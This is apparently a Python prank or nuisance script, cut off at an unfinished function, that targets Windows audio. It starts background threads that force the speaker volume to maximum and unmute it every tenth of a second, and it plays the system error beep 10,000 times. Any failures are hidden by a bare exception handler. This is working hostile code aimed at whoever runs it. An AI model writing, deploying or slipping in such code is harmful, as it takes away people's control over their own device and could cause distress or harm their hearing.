import os
import time
import platform
import webbrowser
import subprocess

try:
    import threading
    import winsound
    import time
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

    # ===== MAX VOLUME LOOP =====
    def max_volume_loop():
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_,
            CLSCTX_ALL,
            None
        )
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        while True:
            volume.SetMasterVolumeLevelScalar(1.0, None)
            volume.SetMute(0, None)
            time.sleep(0.1)

    # ===== WINDOWS ERROR SOUND LOOP =====
    def sound_loop():

        ERROR_COUNT = 10000

        print("\n[+] WINDOWS ERROR SOUND MODULE STARTED...\n")

        for i in range(ERROR_COUNT):

            print(f"[{i+1}/{ERROR_COUNT}] Playing error sound...")

            winsound.MessageBeep(winsound.MB_ICONHAND)

            time.sleep(0.1)

    threading.Thread(target=max_volume_loop, daemon=True).start()
    threading.Thread(target=sound_loop, daemon=True).start()

except:
    pass


def clear():
